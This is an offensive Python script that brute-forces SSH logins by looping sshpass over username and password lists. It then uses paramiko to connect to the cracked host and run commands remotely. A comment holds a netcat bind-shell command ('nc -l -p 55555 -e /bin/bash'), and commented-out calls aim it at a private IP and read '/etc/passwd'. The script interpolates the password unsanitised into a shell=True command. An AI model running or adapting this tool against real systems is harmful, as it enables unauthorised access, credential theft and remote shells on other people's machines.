#!/bin/python3
from pathlib import Path
from subprocess import run, PIPE
import paramiko

def processList(inp = "")->list:
    """ Function that process lists txts in lists. """
    with open(inp, "r+") as f:
            tmp = f.readlines()
    lst = []
    for k in tmp:
        lst.append(k.strip())
    return lst


def getSshCredsAndConn(ulist="",plist="",domain="")->tuple[(str,str)]:
    """ Slow bruteforce of ssh credentials. """   
    uname = processList(ulist) # "./init/userlist"
    passwd = processList(plist) # "./init/passlist"
    retUsr = "x"
    retPass= "x" 
    for user in uname:
        for password in passwd:
            command = f"echo 'exit' | sshpass -p {password} ssh {user}@{domain}"
            print(f"Trying to execute: '{command[15:]}' ")
            proc = run(command,shell=True,stderr=PIPE,stdout=PIPE) # Output is piped 
            # print(f"$? = {proc.returncode}") -- Debug
            if proc.returncode == 0 or proc.returncode == 1:
                print(f"SSH password for {user} in {domain} is {password}")
                retUsr = user
                retPass = password
                break
        if proc.returncode == 0 or proc.returncode == 1:
            break
    return (retUsr,retPass)

def autoSshPawn(usr,password,host,sequence)-> None:
    """ Take ssh credentials to connect and remotely runs\\
        instructions on target machine. """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host,username=usr,password=password)
    except paramiko.AuthenticationException:
        print(f"Can't connect to SSH client.")
        exit(-1)
    
    print(f"Pawning machine through SSH ...")
    for instruction in sequence:
        print(f"Remote execution -> {instruction}")
        stdin, stdout, stderr = ssh.exec_command(instruction,timeout=30) # nc -l -p 55555 -e /bin/bash')
        print(stdout.read().decode("utf8"))
    exit(0)

    
# usr,pwd = getSshCredsAndConn(ulist="./init/userlist",plist="./init/passlist",domain="192.168.1.45")
# print(f"Credentials user = {usr} | password={pwd}")
# autoSshPawn(usr,pwd,"192.168.1.45",['whoami',
#                                     'pwd',
#                                     'ls -la',
#                                     'cat /etc/passwd',
#                                     'getent group sudo'])
